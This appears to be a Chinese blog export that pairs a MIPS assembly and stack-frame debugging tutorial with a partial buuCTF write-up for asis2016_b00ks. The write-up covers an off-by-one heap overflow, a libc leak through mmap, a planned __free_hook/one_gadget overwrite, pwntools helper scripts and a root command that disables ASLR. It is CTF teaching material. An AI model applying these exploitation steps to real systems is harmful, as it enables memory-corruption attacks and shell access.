<td><code>lw $t2, 4($t3)</code></td>
<td><code>$t2</code> 加载内存地址 <code>$t3 + 4</code> 处的值。</td>
</tr>
<tr>
<td align="center"><code>sw</code></td>
<td>将寄存器中的值存储到内存中。</td>
<td><code>sw $t0, 4($t1)</code></td>
<td>内存地址 <code>$t1 + 4</code> 处存储 <code>$t0</code> 的值。</td>
</tr>
<tr>
<td align="center"><code>add</code></td>
<td>将两个寄存器的值相加。</td>
<td><code>add $t0, $t1, $t2</code></td>
<td><code>$t0 = $t1 + $t2</code></td>
</tr>
<tr>
<td align="center"><code>addi</code></td>
<td>将寄存器中的值与立即数相加。</td>
<td><code>addi $t0, $t1, 5</code></td>
<td><code>$t0 = $t1 + 5</code></td>
</tr>
<tr>
<td align="center"><code>addu</code></td>
<td>无符号加法，将两个寄存器的值相加。</td>
<td><code>addu $t0, $t1, $t2</code></td>
<td><code>$t0 = $t1 + $t2</code></td>
</tr>
<tr>
<td align="center"><code>addiu</code></td>
<td>无符号加法，将寄存器中的值与立即数相加。</td>
<td><code>addiu $t0, $t1, 10</code></td>
<td><code>$t0 = $t1 + 10</code></td>
</tr>
<tr>
<td align="center"><code>jr</code></td>
<td>跳转到寄存器中保存的地址。</td>
<td><code>jr $ra</code></td>
<td>程序跳转到 <code>$ra</code> 中保存的地址。</td>
</tr>
<tr>
<td align="center"><code>jal</code></td>
<td>跳转到指定地址，并将返回地址保存到 <code>$ra</code>。</td>
<td><code>jal func</code></td>
<td><code>$ra</code> 保存返回地址，程序跳转到 <code>func</code>。</td>
</tr>
<tr>
<td align="center"><code>jalr</code></td>
<td>跳转到寄存器中保存的地址，并将返回地址保存到 <code>$ra</code>。</td>
<td><code>jalr $t0</code></td>
<td><code>$ra</code> 保存返回地址，程序跳转到 <code>$t0</code>。</td>
</tr>
<tr>
<td align="center"><code>bnez</code></td>
<td>如果寄存器的值不为零，则跳转到指定地址。</td>
<td><code>bnez $s1, label</code></td>
<td>如果 <code>$s1 != 0</code>，程序跳转到 <code>label</code>。</td>
</tr>
<tr>
<td align="center"><code>b</code></td>
<td>无条件跳转到指定地址。</td>
<td><code>b label</code></td>
<td>程序跳转到 <code>label</code>。</td>
</tr>
</tbody></table>
<p><em>MIPS汇编指令均为32位（4字节）长度</em></p>
<h2 id="MIPS函数调用与参数传递"><a href="#MIPS函数调用与参数传递" class="headerlink" title="MIPS函数调用与参数传递"></a>MIPS函数调用与参数传递</h2><p>在讲MIPS程序的函数调用约定前，先要明确：</p>
<ol>
<li>叶子函数：不会再调用其他函数的函数</li>
<li>非叶子函数：函数内部会调用其他函数的函数</li>
</ol>
<p>函数A调用函数B，如果函数B是叶子函数，那么在跳转到B函数的时候，<code>$ra</code>寄存器中会存入函数B的返回地址；</p>
<p>如果函数B是非叶子函数，在跳转到B函数的时候，先在<code>$ra</code>寄存器中存入函数B的返回地址，并且在栈中记录<code>$ra</code>寄存器的值。</p>
<blockquote>
<p>因为函数B在内部还要调用其他函数，<code>$ra</code>寄存器会变，程序在从函数B返回到函数A的时候，就可以从栈中将之前记录的值读到<code>$ra</code>寄存器，就可以返回到函数A了</p>
</blockquote>
<p><strong>参数的传递</strong></p>
<p>· 前四个参数：如果函数的参数数量小于或等于四个，这些参数会依次存放在 <code>$a0、$a1、$a2、$a3</code> 寄存器中。</p>
<p>· 多于四个的参数：多出的参数会被存放到栈中。即调用者（函数 A）会在自己的栈顶为被调用者（函数 B）的参数预留空间，并将多出的参数存入该空间</p>
<p>· 即使参数数量少于或等于四个，调用者（函数 A）仍然需要在栈中为被调用者（函数 B）的前四个参数预留空间。</p>
<p>· 被调用者（函数 B）会将前四个参数从 <code>$a0 ~ $a3</code> 寄存器复制到栈中预留的空间——这个空间被称为<code>调用参数空间</code></p>
<p>有了上面的基础之后，我们就可以调试<code>demo_32_little</code>对MIPS架构的寄存器、汇编指令和函数调用约定做一个实例分析，加深印象。</p>
<h1 id="实例分析：demo-32-little"><a href="#实例分析：demo-32-little" class="headerlink" title="实例分析：demo_32_little"></a>实例分析：demo_32_little</h1><p>首先在IDA里面打开<code>demo_32_little</code>，找到main函数的起始地址0x4007DC<br><img src="/./images/p8/image-13.png"><br>为了调试方便，使用<code>symbol-file ./demo_32_little</code>加载符号表<br><img src="/./images/p8/image-14.png"></p>
<p>进入调试后，下断点到main函数处，<code>c</code>跳到断点处<br><img src="/./images/p8/image-15.png"></p>
<h2 id="mian函数"><a href="#mian函数" class="headerlink" title="mian函数"></a>mian函数</h2><p>main函数开头如下，从main函数栈帧的布置和跳转到调用的mySum函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4007dc &lt;main&gt;       addiu  $sp, $sp, -0x28      sp =&gt; 0x40800028 (0x40800050 + -0x28)</span><br><span class="line">0x4007e0 &lt;main+4&gt;     sw     $ra, 0x24($sp)       [0x4080004c] &lt;= 0x400930 (__libc_start_call_main+116) ◂— lw $gp, 0x10($sp)</span><br><span class="line">0x4007e4 &lt;main+8&gt;     sw     $fp, 0x20($sp)       [0x40800048] &lt;= 0x40800050 ◂— 0</span><br><span class="line">0x4007e8 &lt;main+12&gt;    move   $fp, $sp             FP =&gt; 0x40800028 —▸ 0x49e9a8 (_dl_main_map) ◂— 0</span><br><span class="line">0x4007ec &lt;main+16&gt;    lui    $gp, 0x4a            GP =&gt; 0x4a0000 (_dl_static_dtv+472)</span><br><span class="line">0x4007f0 &lt;main+20&gt;    addiu  $gp, $gp, 0x72d0     GP =&gt; 0x4a72d0 (0x4a0000 + 0x72d0)</span><br><span class="line">0x4007f4 &lt;main+24&gt;    sw     $gp, 0x10($sp)       [0x40800038] &lt;= 0x4a72d0 ◂— 0</span><br><span class="line">0x4007f8 &lt;main+28&gt;    addiu  $a1, $zero, 2        A1 =&gt; 2 (0 + 2)</span><br><span class="line">0x4007fc &lt;main+32&gt;    addiu  $a0, $zero, 1        A0 =&gt; 1 (0 + 1)</span><br><span class="line">0x400800 &lt;main+36&gt;    jal    mySum                       &lt;mySum&gt;</span><br><span class="line">0x400804 &lt;main+40&gt;    nop</span><br></pre></td></tr></table></figure>

<p>下面的表格是每行汇编执行前后相应寄存器或内存地址的变化，从中我们关注一下mips开辟栈帧的方式，以及调用函数时的变化</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>执行前</th>
<th>执行后</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>addiu $sp,$sp,-0x28</code></td>
<td><code>sp=0x40800050</code></td>
<td><code>sp=0x40800028</code></td>
<td>为函数<code>main</code>分配0x28字节栈空间，满足8字节对齐</td>
</tr>
<tr>
<td><code>sw $ra,0x24($sp)</code></td>
<td><code>ra=0x400930</code><br><code>sp=0x40800028</code></td>
<td><code>[0x4080004c]=0x400930</code></td>
<td>返回地址$ra存储到栈中偏移0x24的位置<br><code>SP+0x24=0x40800028+0x24=0x4080004c</code></td>
</tr>
<tr>
<td><code>sw $fp,0x20($sp)</code></td>
<td><code>fp=0x40800050</code><br><code>sp=0x40800028</code><br><code>s8=0</code></td>
<td><code>[0x40800048]=0</code></td>
<td>此时的<code>$fp</code>在编译器眼里是<code>$s8</code>，而<code>$s8=0x0</code></td>
</tr>
<tr>
<td><code>move $fp,$sp</code></td>
<td><code>fp=0x40800050</code><br><code>s8=0</code><br><code>sp=0x40800028</code></td>
<td><code>fp=0x40800050</code><br><code>s8=0x40800028</code><br><code>sp=0x40800028</code></td>
<td>此时的<code>$fp</code>在编译器眼里是<code>$s8</code>，所以实际上是<code>move $s8,$sp</code></td>
</tr>
<tr>
<td><code>lui $gp,0x4a</code></td>
<td><code>GP=全局指针</code></td>
<td><code>GP=0x4a0000</code></td>
<td>加载高位立即数到全局指针GP，其余低位用0填充</td>
</tr>
<tr>
<td><code>addiu $gp,$gp,0x72d0</code></td>
<td><code>GP=0x4a0000</code></td>
<td><code>GP=0x4a72d0</code></td>
<td>全局指针再加0x72d0，指向符号表基址</td>
</tr>
<tr>
<td><code>sw $gp,0x10($sp)</code></td>
<td><code>GP=0x4a72d0</code><br><code>sp=0x40800028</code></td>
<td><code>[0x40800038]=0x4a72d0</code></td>
<td>保存全局指针防覆盖</td>
</tr>
<tr>
<td><code>addiu $a1,$zero,2</code></td>
<td><code>A1=0x40800154</code></td>
<td><code>A1=2</code></td>
<td>设置函数参数2</td>
</tr>
<tr>
<td><code>addiu $a0,$zero,1</code></td>
<td><code>A0=1</code></td>
<td><code>A0=1</code></td>
<td>设置函数参数1</td>
</tr>
<tr>
<td><code>jal mySum</code></td>
<td><code>ra=0x400930</code><br><code>PC=0x400800</code></td>
<td><code>RA=0x400808</code><br><code>PC=0x400808</code></td>
<td>pc是mips的eip，跳转函数并保存返回地址</td>
</tr>
<tr>
<td><code>nop</code></td>
<td>无变化</td>
<td>无变化</td>
<td></td>
</tr>
</tbody></table>
<p><em><code>[</code>、<code>]</code>代表该内存中的值（即C语言中的解引用）</em><br><em><code>$fp</code>和<code>$s8</code>是有区分的，IDA会混淆这两个寄存器，gdb-multiarch会将所有的<code>$fp</code>和<code>$s8</code>都辨别为<code>$fp</code>,在调试分析时要注意</em></p>
<ol>
<li><p>栈帧的布局（1-7行）<br>第一行<code>$sp</code>指向栈顶，开辟了栈帧空间，类似x86的<code>esp</code><br>第二行，在<code>$fp-0x4</code>的位置存放返回地址，<code>$fp</code>有点像x86的<code>ebp</code><br>第3-7行定义了<code>$s8</code>和<code>$gp</code>，<code>$gp</code>指向了符号表，从而更高效的寻址。<br><strong>同时，在栈顶为参数预留空间</strong>，整个栈帧如下<br><img src="/./images/p8/image-44.png"><br><strong>我们可以将<code>$sp</code>看作x86的<code>esp</code>；<code>$fp</code>看作<code>ebp</code>，需要注意mips的栈内地址计算是用<code>$sp</code>计算</strong></p>
</li>
<li><p>参数的传递（8-9行）<br><code>a0</code>、<code>a1</code>寄存器中存入参数<br><img src="/./images/p8/image-29.png"></p>
</li>
<li><p>跳转到mySum函数（10-11行）<br>对比x86，在x86中调用函数时，先将Return Address压栈，形成这样的一种栈帧结构<br><img src="/./images/p8/image-37.png"><br>而在mips中，<code>$fp</code>指针来到<code>$sp</code>的位置，<strong>并且<code>$ra</code>寄存器中存入mySum的返回地址（$ra&#x3D;0x400808）</strong>，然后<code>nop</code>来到被调用的函数<br><img src="/./images/p8/image-31.png"><br>先画出mips中的main函数的栈帧结构，完整的栈帧在下一小节给出<br><img src="/./images/p8/image-45.png"></p>
</li>
</ol>
<p>注意：  </p>
<ol>
<li>调用者函数的栈顶要为参数预留空间 </li>
<li>如果参数多于四个，在调用者函数的栈帧中预留四个参数的空间后，多出的参数直接存到栈上</li>
<li>参数通过<code>$a0-$a1</code>传递  </li>
<li>全局指针gp<code>0x4a72d0</code>指向全局偏移表（.got），可以快速访问静态数据  </li>
<li>MIPS架构的跳转指令后存在一个分支延迟槽，这是MIPS流水线设计的独特性质——延迟槽中的指令（可为有效操作或nop）总会在跳转指令生效前执行，允许CPU在跳转间隙完成一条指令，从而提升程序运行效率。</li>
<li><code>$fp</code>和<code>$s8</code>虽然是同一个寄存器，但他们的值是独立的.如下图<br><img src="/./images/p8/image-17.png"></li>
</ol>
<h2 id="mySum函数"><a href="#mySum函数" class="headerlink" title="mySum函数"></a>mySum函数</h2><p><code>si</code>进入mySum函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4007a0 &lt;mySum&gt;:	addiu	sp,sp,-16</span><br><span class="line">0x4007a4 &lt;mySum+4&gt;:	sw	fp,12(sp)</span><br><span class="line">0x4007a8 &lt;mySum+8&gt;:	move	fp,sp</span><br><span class="line">0x4007ac &lt;mySum+12&gt;:	sw	a0,16(sp)</span><br><span class="line">0x4007b0 &lt;mySum+16&gt;:	sw	a1,20(sp)</span><br><span class="line">0x4007b4 &lt;mySum+20&gt;:	lw	v1,16(sp)</span><br><span class="line">0x4007b8 &lt;mySum+24&gt;:	lw	v0,20(sp)</span><br><span class="line">0x4007bc &lt;mySum+28&gt;:	addu	v0,v1,v0</span><br><span class="line">0x4007c0 &lt;mySum+32&gt;:	sw	v0,4(sp)</span><br><span class="line">0x4007c4 &lt;mySum+36&gt;:	lw	v0,4(sp)</span><br><span class="line">0x4007c8 &lt;mySum+40&gt;:	move	sp,fp</span><br><span class="line">0x4007cc &lt;mySum+44&gt;:	lw	fp,12(sp)</span><br><span class="line">0x4007d0 &lt;mySum+48&gt;:	addiu	sp,sp,16</span><br><span class="line">0x4007d4 &lt;mySum+52&gt;:	jr	ra</span><br><span class="line">0x4007d8 &lt;mySum+56&gt;:	nop</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p>栈帧的布置（1-3行）<br>注意第三行的<code>move	fp,sp</code>实际上是对<code>$s8</code>操作，也就是<code>move	s8,sp</code><br><img src="/./images/p8/image-46.png"></p>
</li>
<li><p>参数的读取（4-7行）<br>在<code>sw	a0,16(fp);sw	a1,20(fp)</code>执行后，参数预留空间中的 <code>0x40800028</code>和<code>0x4080002c</code>的位置存上了<code>1</code>、<code>2</code>这两个参数。然后<code>lw	v1,16(fp);lw	v0,20(fp)</code>，这两条指令就是将<code>1</code>、<code>2</code>两个参数加载到寄存器<code>$v0</code>和<code>$v1</code>中<br><img src="/./images/p8/image-47.png"></p>
</li>
<li><p>计算（8-10行）<br><code>addu	v0,v1,v0</code>相当于<code>v0 = 2 + 1 = 3</code>，下面两行将计算的结果<code>3</code>存到了<code>sp+4</code>的位置<br><img src="/./images/p8/image-48.png"><br>调试窗口中验证一下，也确实如此<br><img src="/./images/p8/image-24.png"></p>
</li>
<li><p>栈帧的恢复（11-13行）<br>这里很简单，恢复sp指针，然后<code>jr $ra</code>回到返回地址。</p>
</li>
</ol>
<p>X86架构和MIPS架构的栈帧布局对比：<br><img src="/./images/p8/image-49.png"></p>
<h2 id="mips调用非叶子函数时的区别"><a href="#mips调用非叶子函数时的区别" class="headerlink" title="mips调用非叶子函数时的区别"></a>mips调用非叶子函数时的区别</h2><p>我们知道，main函数其实是被<code>__libc_start_main</code>函数调用的，在这个demo中，其实main函数是非叶子函数，我们刚才说过，调用叶子函数和调用非叶子函数的栈帧布局是不一样的：调用非叶子函数时在<code>$fp-0x4</code>的位置记录当前<code>$ra</code>的值，也就是上面图片中的<code>0x400930（main_ret_addr）</code>。</p>
<p>回过头再看一下对main函数的分析中的第二行，正是做了这件事情：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw $ra,0x24($sp)</span><br></pre></td></tr></table></figure>
<p><img src="/./images/p8/image-52.png"></p>
<p>那么在main函数返回的时候，想当然也是先要从<code>$fp-0x4</code>的位置读值到<code>$ra</code>，然后<code>jr	ra;nop</code>即可。<br>一路ni来到<code>return 0;</code>处<br><img src="/./images/p8/image-50.png"><br>这一段的汇编如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x40082c &lt;main+80&gt;:	lw	gp,16(s8)</span><br><span class="line">0x400830 &lt;main+84&gt;:	move	v0,zero</span><br><span class="line">0x400834 &lt;main+88&gt;:	move	sp,s8</span><br><span class="line">0x400838 &lt;main+92&gt;:	lw	ra,36(sp)</span><br><span class="line">0x40083c &lt;main+96&gt;:	lw	s8,32(sp)</span><br><span class="line">0x400840 &lt;main+100&gt;:	addiu	sp,sp,40</span><br><span class="line">0x400844 &lt;main+104&gt;:	jr	ra</span><br><span class="line">0x400848 &lt;main+108&gt;:	nop</span><br></pre></td></tr></table></figure>
<p>其中这条语句<code>lw	ra,36(sp)</code>，就是把先前记录在栈上的<code>0x400930</code>读到了寄存器中<br><img src="/./images/p8/image-51.png"><br>继而<code>jr	ra;nop</code>，从而跳转到main的返回地址处。</p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>iot</tag>
        <tag>IOT安全</tag>
        <tag>MIPS架构</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuCTF刷题】asis2016_b00ks</title>
    <url>/posts/b08e/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>题目链接： <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FzaXMyMDE2X2IwMGtz">https://buuoj.cn/challenges#asis2016_b00ks<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>2016年的题花了好几天时间才做出来，遂记录一下。<br>通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展，而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</p>
<span id="more"></span>


<h1 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h1><p>进入程序，先输入一个作者名，跳出目录<br><img src="/./images/p7/image.png"></p>
<p>依次尝试，根据输出预定义一下对应函数</p>
<ol>
<li><p>Create a book<br>进入创建要输入name_size , name , des_size , des<br> <img src="/./images/p7/image-1.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Delete a book<br> 删除功能直接输入book_id就可以了，Book_id可以在打印功能中看到<br> <img src="/./images/p7/image-2.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def delete(book_id):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(id))</span><br></pre></td></tr></table></figure>



</li>
<li><p>Edit a book<br> 编辑功能输入要编辑的Book_id，然后编辑内容<br> <img src="/./images/p7/image-3.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def edit(book_id,des):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Print book detail<br> 打印所有书的信息，包括作者<br> <img src="/./images/p7/image-4.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Print():</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Change current author name<br> 切换作者，也是直接输入新作者名就可以<br> <img src="/./images/p7/image-5.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def change(author):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,author)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>放入IDA里面，对一些函数进行重命名<br><img src="/./images/p7/image-6.png"><br>先看scanf_author函数，通过前面的运行测试我们能猜出来大概是输入作者名的函数，点进去看到确实是让我们输入作者名<br><img src="/./images/p7/image-7.png"><br>是通过调用scanf_to_ptr的函数输入作者名，并且有两个参数，第一个参数off_202018其实是data段上的一个指针<br><img src="/./images/p7/image-9.png"><br>点进去函数看一下<br><img src="/./images/p7/image-8.png"><br>可以看到，通过循环变量i向off_202018这个指针的地址读入作者名，第二个参数在 i=&#x3D;a2 判断中作为循环终止的条件，注意到i是从0开始变化，如果循环条件是 i&#x3D;&#x3D;a2 ，这个循环实际上会执行33次，就导致作者名的长度是33个字节，有一个字节的溢出。<br><strong>scanf_to_ptr的函数存在off-by-one漏洞</strong></p>
<h2 id="Create-a-book"><a href="#Create-a-book" class="headerlink" title="Create a book"></a>Create a book</h2><p>首先输入name_size的大小，然后根据size分配书名的堆，并把堆地址给ptr_name。如果堆空间分配成功，则向此堆中写入书名（第21行）<br><img src="/./images/p7/image-11.png"><br>注意写入书名调用的是scanf_to_ptr函数，我们分析过这个函数的功能是向第一个参数对应的空间写入内容，并且这个函数存在off-by-one漏洞。</p>
<p>同样的操作，再输入desc_size，根据size再分配一个堆给书的内容<br><img src="/./images/p7/image-12.png"><br>如果堆空间分配成功，则调用漏洞函数scanf_to_ptr向堆中写入书的内容</p>
<p>接下来看这里，分配了一个0x20的空间给一个变量，而这个变量其实存着一个结构体<br><img src="/./images/p7/image-13.png"></p>
<p>第56、58、59、60行描述了结构体的成员变量，根据这些信息还原一下结构体是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;               </span><br><span class="line">    int id;          </span><br><span class="line">    char *name;                 </span><br><span class="line">    char *description;          </span><br><span class="line">    int description_size; </span><br><span class="line">&#125; Book;</span><br></pre></td></tr></table></figure>
<p>可以看到，程序用一个结构体去描述图书的信息</p>
<p>57行将结构体的地址赋给了off_202010指针，而这个地址我们之前见过一次。在main函数的一开始，我们<strong>在off_202018指针指向的地址存放了作者名，在off_202010指针指向的地址存放图书结构体</strong><br><img src="/./images/p7/image-17.png"><br><strong>注意黄色标注的区域，作者名在超过0x20——也就是32个字节后，就会来到off_202010指针所指的空间。我们在前面分析知道，作者名是通过scanf_to_ptr函数读入，而这个函数存在off_by_one漏洞，导致作者名有一个字节的溢出，而这个溢出则会直接覆盖off_202010的第一个低字节。</strong><br>如果我们给作者名输入32个字符，因为字符串是\x00结尾，所以\x00会作为第33个字符溢出到off_202010的第一个低字节。</p>
<h2 id="Delete-a-book"><a href="#Delete-a-book" class="headerlink" title="Delete a book"></a>Delete a book</h2><p>delete函数通过free释放空间，并且置为0，不存在UAF漏洞<br><img src="/./images/p7/image-15.png"></p>
<h2 id="Change-current-author-name"><a href="#Change-current-author-name" class="headerlink" title="Change current author name"></a>Change current author name</h2><p>改变作者时，scanf_to_ptr同样是向off_202018的空间读入作者名<br><img src="/./images/p7/image-16.png"></p>
<h2 id="Efit-和-Print"><a href="#Efit-和-Print" class="headerlink" title="Efit 和 Print"></a>Efit 和 Print</h2><p>这两个函数没什么特殊的<br><img src="/./images/p7/image-18.png"><br><img src="/./images/p7/image-19.png"></p>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-替换libc"><a href="#1-替换libc" class="headerlink" title="1.替换libc"></a>1.替换libc</h2><p>由于是2016年的题，本地环境很难与远程环境一致，我这里用patchelf换了ubuntu 16的libc和ld，进行动态调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./b00ks</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./b00ks </span><br></pre></td></tr></table></figure>
<p>ldd验证一下<br><img src="/./images/p7/image-20.png"></p>
<h2 id="2-动态调试-泄露book1-addr"><a href="#2-动态调试-泄露book1-addr" class="headerlink" title="2.动态调试 &amp;&amp; 泄露book1_addr"></a>2.动态调试 &amp;&amp; 泄露book1_addr</h2><p>在动态调试之前可以先把ASLR保护关掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//重启机器后ASLR保护会自动打开    </span><br></pre></td></tr></table></figure>

<p>gdb r 调试运行程序，输入作者名时输入32个字节<br><img src="/./images/p7/image-21.png"><br>ctrl+c 进入调试<br><img src="/./images/p7/image-22.png"><br>记录起始地址0x555555400000，作者名在偏移off_202018处，定位到作者名地址，<strong>绿框中的\x00其实是作者名溢出的字节</strong><br><img src="/./images/p7/image-24.png"></p>
<p>按c回到程序中，创建一本书名和内容大小均为10的图书<br><img src="/./images/p7/image-25.png"><br>ctrl+c 进入调试，看看内存布局<br><img src="/./images/p7/image-26.png"><br>发现在作者名后面紧跟上了一个地址，根据静态分析我们推测这个地址指向刚刚创建的图书结构体，跟进去看的确如此<br><img src="/./images/p7/image-27.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555607460 = 图书结构体 = book1_id</span><br><span class="line">0x0000555555607468 = book1_name</span><br><span class="line">0x0000555555607470 = book1_desc</span><br><span class="line">0x0000555555607478 = book1_desc_size</span><br></pre></td></tr></table></figure>
<p>并且，由于author和存放图书结构体的地址是挨着的，当我们print作者名的时候，由于没有\x00截断，也会把图书结构体地址泄露出来<br><img src="/./images/p7/image-44.png"><br><img src="/./images/p7/image-45.png"><br>通过下面的脚本泄露book1_addr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(10,b&#x27;AAAA&#x27;,10,b&#x27;aaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br></pre></td></tr></table></figure>


<p>根据前面的分析，如果我们向作者名输入32个字符，会溢出\x00,然后覆盖黄框中的地位\x60为\x00<br><img src="/./images/p7/image-26.png"></p>
<p>验证一下，回到程序中，重新输入32个字节的作者名<br><img src="/./images/p7/image-28.png"><br>再查看内存，确实地位被覆盖为了\x00<br><img src="/./images/p7/image-29.png"><br>此时，程序会认为0x0000555555607400是book1结构体的地址（也是book1_id）<br><img src="/./images/p7/image-31.png"><br>而此时，这里什么都没有，显然这里是存在漏洞的，那该怎么利用呢？<br><strong>多试几次我们会发现，根据我们输入的name_size和desc_size的不同，图书结构体的地址会发生变化</strong><br>当name_size&#x3D;64，desc_size&#x3D;32时<br><img src="/./images/p7/image-33.png"><br>当name_size&#x3D;256，desc_size&#x3D;32时<br><img src="/./images/p7/image-34.png"></p>
<h2 id="3-fake-book的故事"><a href="#3-fake-book的故事" class="headerlink" title="3.fake_book的故事"></a>3.fake_book的故事</h2><p>如果我们进行适当的调整，让book1_desc的地址的低位是\x00，比如在我当前环境下name_size&#x3D;208，desc_size&#x3D;32时内存是这样的<br><img src="/./images/p7/image-36.png"><br>此时book1_desc在0x0000555555607500这个地址，我们可以通过edit功能修改这里的内容</p>
<p>为什么要这样做呢？想想off_by_one漏洞的利用，我们说过我们可以通过change_author，输入32个字节让他溢出<br><img src="/./images/p7/image-37.png"><br>导致上图中红色框框的地址低位变为\x00<br><img src="/./images/p7/image-38.png"><br>现在再来看看是什么情况?现在程序认为黄色标注的才是他的book1<br><img src="/./images/p7/image-39.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555607500 = book1_id</span><br><span class="line">0x555555607508 = book1_name</span><br><span class="line">0x555555607510 = book1_desc</span><br><span class="line">0x555555607518 = book1_desc_size</span><br></pre></td></tr></table></figure>
<p>而在没有被纂改前，这段区域其实是book1_desc的内容，感受到不对劲了吗？<br><strong>这段区域我们是可以预先用edit功能布置的</strong>。重新再来一遍，回到溢出前的状态<br><img src="/./images/p7/image-42.png"><br>c回车，选择edit，修改图书内容<br><img src="/./images/p7/image-41.png"><br>回来看看book1_desc的内容<br><img src="/./images/p7/image-43.png"><br>这段6666在我们利用off_by_one漏洞溢出作者名后，会成为fake_book1_id和fake_book1_name<br><strong>明确一下，fake_book1_id和fake_book1_name的内容我们可以通过edit自定义</strong></p>
<p>这有什么用呢？我们的思路是先拿到libc基地址，通过libc基地址去计算__free_hook真实地址，在伪造的图书结构体中部署__free_hook钩子，然后free一个指向one_gadget的地址，触发execve(’&#x2F;bin&#x2F;sh’)拿到shell。那么我们先得拿到libc_base。</p>
<h2 id="4-泄露libc基地址"><a href="#4-泄露libc基地址" class="headerlink" title="4.泄露libc基地址"></a>4.泄露libc基地址</h2><p><strong>当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展。而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</strong><br>看一下top_chunk大小<br><img src="/./images/p7/image-46.png"><br>所以，我们申请一个大于0x20b81的空间，使程序使用mmap拓展空间，这就是book2的申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>
